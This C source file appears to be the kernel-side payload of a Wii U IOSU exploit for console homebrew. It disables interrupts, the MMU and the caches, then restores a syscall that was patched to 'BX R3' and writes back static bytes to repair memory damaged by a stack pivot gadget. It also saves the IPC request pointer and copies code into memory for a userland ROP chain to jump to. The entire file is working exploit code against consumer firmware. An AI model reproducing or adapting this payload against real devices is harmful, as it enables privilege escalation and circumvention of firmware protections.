#include <stdint.h>
#include <stddef.h>
#include <string.h>

extern uint32_t GetControlRegister(void);
extern void SetControlRegister(uint32_t newControlRegister);
extern uint32_t GetCPSR(void);
extern void SetCPSR(uint32_t newCPSR);
extern void ClearEntireDCache(void);

#define CPSR_IRQ_BIT	(1 << 7)
#define CPSR_FIQ_BIT	(1 << 6)

#define CR_MMU_BIT 		(1 << 0)
#define CR_DCACHE_BIT	(1 << 2)
#define CR_ICACHE_BIT	(1 << 12)

/* just static data @ 0x101001DC - 0x68 (from 5.5.X fw.img, same address) */
static const char usbStackPivotDamageFix[] = {
	0xE5,0x8D,0xE0,0x04, 0xE5,0x8D,0xC0,0x08, 0xE5,0x8D,0x40,0x0C, 0xE5,0x8D,0x60,0x10,
	0xEB,0x00,0xB2,0xFD, 0xEA,0xFF,0xFF,0xC9, 0x10,0x14,0x03,0xF8, 0x10,0x62,0x4D,0xD3,
	0x10,0x14,0x50,0x00, 0x10,0x14,0x50,0x20, 0x10,0x14,0x00,0x00, 0x10,0x14,0x00,0x90,
	0x10,0x14,0x00,0x70, 0x10,0x14,0x00,0x98, 0x10,0x14,0x00,0x84, 0x10,0x14,0x03,0xE8,
	0x10,0x14,0x00,0x3C, 0x00,0x00,0x01,0x73, 0x00,0x00,0x01,0x76, 0xE9,0x2D,0x4F,0xF0,
	0xE2,0x4D,0xDE,0x17, 0xEB,0x00,0xB9,0x92, 0xE3,0xA0,0x10,0x00, 0xE3,0xA0,0x20,0x03,
	0xE5,0x9F,0x0E,0x68, 0xEB,0x00,0xB3,0x20,
};

void memcpy_(void *where, const void *from, size_t size) {

	uint8_t *where_ = (uint8_t*)where;
	uint8_t *from_ = (uint8_t*)from;

	for (size_t i = 0; i < size; i++)
		where_[i] = from_[i];

}

int _main() {


	uint32_t savedControlRegister = GetControlRegister();
	uint32_t newControlRegister = savedControlRegister;

	uint32_t savedCPSR = GetCPSR();
	uint32_t newCPSR = savedCPSR;

	/* Mask IRQ, FIQ and disable MMU, ICache, DCache */
	newCPSR |= CPSR_IRQ_BIT;
	newCPSR |= CPSR_FIQ_BIT;
	SetCPSR(newCPSR);

	ClearEntireDCache();

	newControlRegister &= ~CR_MMU_BIT;
	newControlRegister &= ~CR_DCACHE_BIT;
	newControlRegister &= ~CR_ICACHE_BIT;
	SetControlRegister(newControlRegister);

	/* Fix syscall 0x4F (the one we patched to BX R3 ) */
	*(uint32_t*)0x08120000 = 0xE92D4030;

	/* https://wiiubrew.org/wiki/IOSU#IPC */
	/* Write the IPC request struct ptr in MEM1, so we can reply (svc 0x49) later on. */
	*(uint32_t**)0x0012F000 = *(uint32_t**)0x1016AD18; // Always in the 0x08148xxx range

	/* Fix damage done by the stack pivot gagdet "construction" */
	memcpy_((void*)(0x101001DC - 0x68), usbStackPivotDamageFix, 0x68);

	/* copy the code to memory, the userland ROP chain will jump to it */
	memcpy_((void*)0x101312D0, (void*)0x00148004, *(uint32_t*)0x00148000);

	/* Reset CR, and CPSR back to what they were */
	SetControlRegister(savedControlRegister);
	SetCPSR(savedCPSR);

	return 0;
}
